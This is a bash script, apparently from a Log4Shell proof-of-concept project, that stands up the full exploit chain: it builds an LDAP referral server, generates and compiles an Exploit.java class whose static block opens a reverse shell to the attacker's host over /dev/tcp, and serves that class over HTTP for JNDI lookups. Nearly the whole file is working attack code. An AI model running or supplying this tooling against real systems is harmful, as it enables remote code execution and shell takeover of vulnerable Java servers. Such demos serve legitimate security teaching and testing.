#!/bin/bash
# Usage: ./init.sh <host_ip> <ldap_port> <http_port> <nc_port>
# Example: ./init.sh 127.0.0.1 1389 8080 1234

print_help() {
    echo "Usage: $0 <host_ip> <ldap_port> <http_port> <nc_port>"
    echo "Example: ./init.sh 127.0.0.1 1389 8080 1234"
    echo ""
    echo "This script does the following steps:"
    echo " 1. 'mvn clean install' on the /ldap-ref-server directory (if target dir is not created)"
    echo " 2. Generates the required code for a reverse shell and places it in Exploit.java"
    echo " 3. Compiles all Java classes in the jndi-classes directory"
    echo " 4. Runs 'python -m http.server <http_port>'"
    echo " 5. Runs 'java -cp target/log4shell-demo-0.0.1-SNAPSHOT.jar log4shell.LDAPRefServer' to start the ldap server in the background"
    echo ""
    echo "Arguments:"
    echo " <host_ip> The IP address to be used on the attacker's host."
    echo " <ldap_port> The port where the ldap server will listen to."
    echo " <http_port> The port used by HTTP server that will serve the compiled java classes."
    echo " <nc_port> The port on which a netcat listener will be listening to."
    echo ""
    echo "Options:"
    echo " --help Show this help message."
}

if [ "$1" == "--help" ]; then
    print_help
    exit 0
fi

if [ "$#" -ne 4 ]; then
    echo "Error: Invalid number of arguments."
    print_help
    exit 1
fi

HOST_IP=$1
LDAP_PORT=$2
HTTP_PORT=$3
NC_PORT=$4
TARGET_DIR="jndi-classes"

generate_exploit() {
    mkdir -p $TARGET_DIR
    cat <<EOL > $TARGET_DIR/Exploit.java
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
import java.io.IOException;
import java.lang.management.ManagementFactory;

public class Exploit implements ObjectFactory {
    static {
        try {
            new ProcessBuilder("bash", "-c", "exec bash -i >& /dev/tcp/$HOST_IP/$NC_PORT 0>&1").start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        // Just returning null to not cause an Exception
        return null;
    }
}
EOL
    echo "Exploit.java file created successfully in $TARGET_DIR!"
}

compile_java_classes() {
    echo "Compiling Java classes in $TARGET_DIR..."
    javac --release 8 -Xlint:-options $TARGET_DIR/*.java
    if [ $? -eq 0 ]; then
        echo "Java classes compiled successfully!"
    else
        echo "Error compiling Java classes. Exiting."
        exit 1
    fi
}

# Step 1: Build the Maven project if the 'target' directory does not exist
if [ ! -d "ldap-ref-server/target" ]; then
    echo "Building the project with Maven..."
    cd ldap-ref-server || exit 1
    mvn clean install
    cd ..
fi

# Step 2: Generate the Exploit.java class
generate_exploit

# Step 3: Compile all Java classes in the directory
compile_java_classes

# Step 4: Start the Python HTTP server in the background
echo "Starting Python HTTP server on port $HTTP_PORT..."
cd $TARGET_DIR || exit 1
python3 -m http.server $HTTP_PORT &
PYTHON_PID=$!
cd ..

# Step 5: Start the LDAPRefServer in the background
echo "Starting LDAPRefServer on port $LDAP_PORT ..."
java -cp ldap-ref-server/target/ldapRefServer-0.0.1-SNAPSHOT.jar tpas.poc.log4shell.LDAPRefServer "http://$HOST_IP:$HTTP_PORT/" $LDAP_PORT &
JAVA_PID=$!

cleanup() {
    echo "Shutting down Python HTTP server (PID: $PYTHON_PID)..."
    kill $PYTHON_PID
    echo "Shutting down LDAPRefServer (PID: $JAVA_PID)..."
    kill $JAVA_PID
}

handle_interrupt() {
    echo "Cleaning up..."
    cleanup
    exit 0
}

trap handle_interrupt INT

while true; do
    sleep 1
done

